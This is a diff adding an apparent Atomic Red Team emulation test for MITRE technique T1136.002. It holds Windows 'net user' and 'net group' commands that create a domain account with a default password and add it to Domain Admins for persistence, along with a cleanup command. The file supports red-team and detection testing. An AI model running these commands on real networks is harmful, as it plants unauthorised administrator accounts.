@@ -1,0 +1,41 @@
+{
+    "name": "Create a new Windows domain admin user",
+    "description": "Creates a new domain admin user in a command prompt. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "net user \"#{username}\" \"#{password}\" /add /domain\nnet group \"#{group}\" \"#{username}\" /add /domain\n",
+        "cleanup_command": "net user \"#{username}\" >nul 2>&1 /del /domain\n",
+        "name": "command_prompt",
+        "elevation_required": false,
+        "type": "Command Executor"
+    },
+    "id": "T1136.002",
+    "tactics": [
+        "Persistence"
+    ],
+    "technique": "Domain Account",
+    "source": "ART",
+    "uuid": "fcec2963-9951-4173-9bfa-98d8b7834e62",
+    "arguments": {
+        "username": {
+            "description": "Username of the user to create",
+            "type": "string",
+            "default": "T1136.002_Admin"
+        },
+        "password": {
+            "description": "Password of the user to create",
+            "type": "string",
+            "default": "T1136_pass123!"
+        },
+        "group": {
+            "description": "Domain administrator group to which add the user to",
+            "type": "string",
+            "default": "Domain Admins"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
